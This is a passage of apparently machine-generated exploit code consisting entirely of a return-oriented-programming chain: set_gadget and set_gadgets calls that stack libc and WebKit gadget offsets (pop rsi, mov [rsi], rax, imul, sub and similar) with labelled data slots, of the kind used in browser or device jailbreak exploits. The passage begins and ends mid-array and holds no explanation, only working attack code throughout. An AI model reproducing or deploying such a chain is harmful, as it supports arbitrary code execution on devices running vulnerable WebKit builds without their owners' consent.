libc_base+793877, //pop rsi
ropchain+103000, //L970
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+103016, //L971
webkit_base+7438103, //mov [rsi], rax
libc_base+792472 //pop rcx
]);
//L970:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L971:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
webkit_base+1838146, //add rax, rcx
libc_base+793877, //pop rsi
ropchain+103104, //L973
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L973:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+103160, //L974
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L974:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+103232, //L977
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L977:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+103288, //L979
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L979:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+2997875, //mov [rax], rcx
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+103392, //L981
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+793877 //pop rsi
]);
//L980:
db([4294967288, 4294967295]); // -0x8
set_gadget(libc_base+792472,); //pop rcx
//L981:
db([0, 0]); // 0x0
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+103480, //L983
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+103496, //L984
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+206806 //pop rdi
]);
//L983:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L984:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+103640, //L988
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+103608, //L986
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+103624, //L987
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L986:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L987:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L988:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+103712, //L990
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L990:
db([0, 0]); // 0x0
set_gadgets([
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+103768, //L991
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L991:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+103848, //L993
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L993:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L994:
db([8, 0]); // 0x8
set_gadget(libc_base+788575,); //pop rax
//L995:
db([4, 0]); // 0x4
set_gadgets([
webkit_base+1506828, //imul rax, rcx
libc_base+793877, //pop rsi
ropchain+103952, //L996
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+103968, //L997
webkit_base+7438103, //mov [rsi], rax
libc_base+792472 //pop rcx
]);
//L996:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L997:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+877175, //sub rax, rcx ; sbb rdx, rcx
libc_base+793877, //pop rsi
ropchain+104056, //L999
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L999:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+104112, //L1000
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1000:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+104232, //L1003
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+793877 //pop rsi
]);
//L1002:
db([16, 0]); // 0x10
set_gadget(libc_base+792472,); //pop rcx
//L1003:
db([0, 0]); // 0x0
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+104320, //L1005
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+104336, //L1006
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+206806 //pop rdi
]);
//L1005:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L1006:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+104480, //L1010
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+104448, //L1008
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+104464, //L1009
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L1008:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L1009:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L1010:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+104552, //L1012
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1012:
db([0, 0]); // 0x0
set_gadgets([
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+104608, //L1013
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1013:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+104688, //L1015
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L1015:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L1016:
db([8, 0]); // 0x8
set_gadget(libc_base+788575,); //pop rax
//L1017:
db([18, 0]); // 0x12
set_gadgets([
webkit_base+1506828, //imul rax, rcx
libc_base+793877, //pop rsi
ropchain+104792, //L1018
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+104808, //L1019
webkit_base+7438103, //mov [rsi], rax
libc_base+792472 //pop rcx
]);
//L1018:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L1019:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
webkit_base+1838146, //add rax, rcx
libc_base+793877, //pop rsi
ropchain+104896, //L1021
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1021:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+104952, //L1022
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1022:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+105024, //L1025
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1025:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+105080, //L1027
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1027:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+2997875, //mov [rax], rcx
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
//L1028:
webkit_base+7438103, //mov [rsi], rax
libc_base+793877 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+105232, //L1030
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+793877 //pop rsi
]);
//L1029:
db([16, 0]); // 0x10
set_gadget(libc_base+792472,); //pop rcx
//L1030:
db([0, 0]); // 0x0
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+105320, //L1032
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+105336, //L1033
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+206806 //pop rdi
]);
//L1032:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L1033:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+105480, //L1037
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+105448, //L1035
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+105464, //L1036
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L1035:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L1036:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L1037:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+105552, //L1039
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1039:
db([0, 0]); // 0x0
set_gadgets([
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+105608, //L1040
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1040:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+105688, //L1042
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L1042:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L1043:
db([8, 0]); // 0x8
set_gadget(libc_base+788575,); //pop rax
//L1044:
db([19, 0]); // 0x13
set_gadgets([
webkit_base+1506828, //imul rax, rcx
libc_base+793877, //pop rsi
ropchain+105792, //L1045
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+105808, //L1046
webkit_base+7438103, //mov [rsi], rax
libc_base+792472 //pop rcx
]);
//L1045:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L1046:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
webkit_base+1838146, //add rax, rcx
libc_base+793877, //pop rsi
ropchain+105896, //L1048
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1048:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+105952, //L1049
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1049:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+106024, //L1052
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1052:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+106080, //L1054
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1054:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+2997875, //mov [rax], rcx
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
//L1055:
libc_base+882884, //mov rax, rcx
libc_base+793877 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+106232, //L1057
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+793877 //pop rsi
]);
//L1056:
db([16, 0]); // 0x10
set_gadget(libc_base+792472,); //pop rcx
//L1057:
db([0, 0]); // 0x0
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+106320, //L1059
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+106336, //L1060
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+206806 //pop rdi
]);
//L1059:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L1060:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+106480, //L1064
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+106448, //L1062
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+106464, //L1063
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L1062:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L1063:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L1064:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+106552, //L1066
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1066:
db([0, 0]); // 0x0
set_gadgets([
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+106608, //L1067
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1067:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+106688, //L1069
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L1069:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L1070:
db([8, 0]); // 0x8
set_gadget(libc_base+788575,); //pop rax
//L1071:
db([20, 0]); // 0x14
set_gadgets([
webkit_base+1506828, //imul rax, rcx
libc_base+793877, //pop rsi
ropchain+106792, //L1072
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+106808, //L1073
webkit_base+7438103, //mov [rsi], rax
libc_base+792472 //pop rcx
]);
//L1072:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L1073:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
webkit_base+1838146, //add rax, rcx
libc_base+793877, //pop rsi
ropchain+106896, //L1075
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1075:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+106952, //L1076
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1076:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+107024, //L1079
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1079:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+107080, //L1081
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1081:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+2997875, //mov [rax], rcx
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
//L1082:
libc_base+793877, //pop rsi
libc_base+793877 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+107232, //L1084
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+793877 //pop rsi
]);
//L1083:
db([16, 0]); // 0x10
set_gadget(libc_base+792472,); //pop rcx
//L1084:
db([0, 0]); // 0x0
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+107320, //L1086
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+107336, //L1087
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+206806 //pop rdi
]);
//L1086:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L1087:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+107480, //L1091
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+107448, //L1089
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+107464, //L1090
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L1089:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L1090:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L1091:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+107552, //L1093
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1093:
db([0, 0]); // 0x0
set_gadgets([
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+107608, //L1094
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1094:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+107688, //L1096
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L1096:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L1097:
db([8, 0]); // 0x8
set_gadget(libc_base+788575,); //pop rax
//L1098:
db([21, 0]); // 0x15
set_gadgets([
webkit_base+1506828, //imul rax, rcx
libc_base+793877, //pop rsi
ropchain+107792, //L1099
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+107808, //L1100
webkit_base+7438103, //mov [rsi], rax
libc_base+792472 //pop rcx
]);
//L1099:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L1100:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
webkit_base+1838146, //add rax, rcx
libc_base+793877, //pop rsi
ropchain+107896, //L1102
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1102:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+107952, //L1103
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1103:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+108024, //L1106
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1106:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+108080, //L1108
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1108:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+2997875, //mov [rax], rcx
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+108184, //L1110
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+793877 //pop rsi
]);
//L1109:
db([4294967288, 4294967295]); // -0x8
set_gadget(libc_base+792472,); //pop rcx
//L1110:
db([0, 0]); // 0x0
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+108272, //L1112
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+108288, //L1113
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+206806 //pop rdi
]);
//L1112:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L1113:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+108432, //L1117
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+108400, //L1115
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+108416, //L1116
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L1115:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L1116:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L1117:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+108504, //L1119
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1119:
db([0, 0]); // 0x0
set_gadgets([
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+108560, //L1120
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1120:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+108640, //L1122
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L1122:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L1123:
db([8, 0]); // 0x8
set_gadget(libc_base+788575,); //pop rax
//L1124:
db([3, 0]); // 0x3
set_gadgets([
webkit_base+1506828, //imul rax, rcx
libc_base+793877, //pop rsi
ropchain+108744, //L1125
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+108760, //L1126
webkit_base+7438103, //mov [rsi], rax
libc_base+792472 //pop rcx
]);
//L1125:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L1126:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+877175, //sub rax, rcx ; sbb rdx, rcx
libc_base+793877, //pop rsi
ropchain+108848, //L1128
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1128:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+108904, //L1129
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1129:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+109024, //L1132
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+793877 //pop rsi
]);
//L1131:
db([16, 0]); // 0x10
set_gadget(libc_base+792472,); //pop rcx
//L1132:
db([0, 0]); // 0x0
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+109112, //L1134
